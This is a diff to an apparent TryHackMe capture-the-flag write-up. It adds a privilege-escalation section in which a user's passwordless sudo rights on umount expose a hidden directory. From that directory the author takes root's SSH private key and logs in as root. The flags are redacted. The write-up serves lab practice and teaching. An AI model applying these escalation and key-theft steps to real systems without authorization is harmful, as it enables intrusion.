@@ -67,7 +67,7 @@ port 8080:
 
 ![port 8080](./img/WebDefault.jpg)
 
-gobuster result :
+result of gobuster :
 
 ```
 root@ip-10-10-10-145:~# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://10.10.33.240:8080/
@@ -558,3 +558,70 @@ THM{REDACTED}
 ### [Q5, Get full root privileges]
 
 ![Cry](./img/cry.gif)
+
+You can see what commands can varg run as root: 
+
+```
+varg@cchq:~$ sudo -l
+Matching Defaults entries for varg on cchq:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User varg may run the following commands on cchq:
+    (root) NOPASSWD: /bin/umount
+```
+
+So what should we unmount?
+So what should we unmount? It looks like, they have mounted something in /opt
+
+```
+varg@cchq:~$ ls /opt/CooctFS/
+bin  boot  etc  games  lib  run  tmp  var
+```
+
+Maybe unmount that with sudo?
+
+```
+varg@cchq:~$ sudo /bin/umount /opt/CooctFS
+```
+
+Interesting ...
+
+```
+varg@cchq:~$ cd /opt/CooctFS/
+varg@cchq:/opt/CooctFS$ ls
+root
+varg@cchq:/opt/CooctFS$ ls root/
+root.txt
+varg@cchq:/opt/CooctFS$ cat root/root.txt 
+hmmm...
+No flag here. You aren't root yet.
+```
+
+But you can find id_rsa private key ... :)
+
+```
+varg@cchq:/opt/CooctFS$ ls -la root/
+total 28
+drwxr-xr-x 5 root root 4096 Feb 20 09:16 .
+drwxr-xr-x 3 root root 4096 Feb 20 09:09 ..
+lrwxrwxrwx 1 root root    9 Feb 20 09:15 .bash_history -> /dev/null
+-rw-r--r-- 1 root root 3106 Feb 20 09:09 .bashrc
+drwx------ 3 root root 4096 Feb 20 09:09 .cache
+drwxr-xr-x 3 root root 4096 Feb 20 09:09 .local
+-rw-r--r-- 1 root root   43 Feb 20 09:16 root.txt
+drwxr-xr-x 2 root root 4096 Feb 20 09:41 .ssh
+varg@cchq:/opt/CooctFS$ cd root/.ssh/
+varg@cchq:/opt/CooctFS/root/.ssh$ ls
+id_rsa  id_rsa.pub
+```
+
+ssh with that, and boom, we are root.😉
+
+```
+root@cchq:~# ls
+root.txt
+root@cchq:~# cat roo*
+THM{REDACTED}
+```
+
+
